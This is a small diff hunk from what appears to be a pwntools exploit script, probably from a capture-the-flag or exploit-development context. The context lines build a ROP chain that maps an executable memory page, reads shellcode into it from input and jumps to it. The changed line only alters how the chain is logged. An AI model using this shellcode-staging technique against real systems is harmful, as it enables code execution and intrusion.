@@ -49,7 +49,7 @@ rop.mmap(0xBAD0F00D, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANO
 rop.read(0, 0xBAD0F00D, 0x1000, 0)
 rop.call(0xBAD0F00D)
 
-log.info("ROP Chain\n%s" % '\n'.join(rop.dump()))
+log.info("ROP Chain\n%s" % rop.dump())
 
 
 #
